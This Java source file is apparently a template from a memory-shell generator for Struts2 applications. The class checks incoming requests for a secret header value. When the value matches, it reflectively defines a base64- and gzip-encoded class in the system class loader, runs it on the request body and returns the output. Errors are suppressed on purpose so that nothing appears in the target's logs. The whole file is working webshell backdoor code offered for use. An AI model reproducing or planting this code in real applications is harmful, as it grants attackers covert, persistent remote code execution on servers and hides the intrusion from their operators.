package org.leo.jmg.mem.shell.http;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.zip.GZIPInputStream;

public class LeoStruts2ActionTpl {

    private static String headerName;
    private static String headerValue;

    private static String coreClassName;
    private static String coreClass;
    private static int respCode;

    public void execute() throws Exception {
        try {
            Class<?> clazz = Class.forName("com.opensymphony.xwork2.ActionContext");
            Object context = clazz.getMethod("getContext").invoke(null);
            Method getMethod = clazz.getMethod("get", String.class);
            HttpServletRequest request = (HttpServletRequest) getMethod.invoke(context, "com.opensymphony.xwork2.dispatcher.HttpServletRequest");
            HttpServletResponse response = (HttpServletResponse) getMethod.invoke(context, "com.opensymphony.xwork2.dispatcher.HttpServletResponse");
            String actualHeader = request.getHeader(headerName);
            if (actualHeader != null && actualHeader.contains(headerValue)) {
                response.setStatus(respCode);
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                byte[] buffer = new byte[1024];
                int bytesRead;
                try {
                    Class.forName(coreClassName,true,ClassLoader.getSystemClassLoader());
                } catch (ClassNotFoundException e) {
                    GZIPInputStream gzipInputStream=new GZIPInputStream(new ByteArrayInputStream(base64Decode(coreClass)));
                    while ((bytesRead = gzipInputStream.read(buffer)) != -1) {
                        byteArrayOutputStream.write(buffer, 0, bytesRead);
                    }
                    Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",new Class[]{String.class, byte[].class, int.class, int.class});
                    defineClassMethod.setAccessible(true);
                    defineClassMethod.invoke(ClassLoader.getSystemClassLoader(),new Object[]{null, byteArrayOutputStream.toByteArray(), (Object) 0, (Object) byteArrayOutputStream.size()});
                }
                finally {
                    InputStream inputStream = request.getInputStream();
                    byteArrayOutputStream.reset();
                    while ((bytesRead = inputStream.read(buffer)) != -1) {
                        byteArrayOutputStream.write(buffer, 0, bytesRead);
                    }
                    try {
                        ((java.lang.reflect.InvocationHandler) Class.forName(coreClassName,true,ClassLoader.getSystemClassLoader()).newInstance()).invoke(null, null, new Object[]{byteArrayOutputStream});
                    } catch (Throwable e) {
                        throw new IllegalStateException("Core invocation failed", e);
                    }
                    response.getOutputStream().write(byteArrayOutputStream.toByteArray());
                }
            }
        } catch (Throwable ignored) {
            // 模板运行失败时保持静默，避免向目标应用日志泄漏实现细节。
        }
    }


    
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }

}
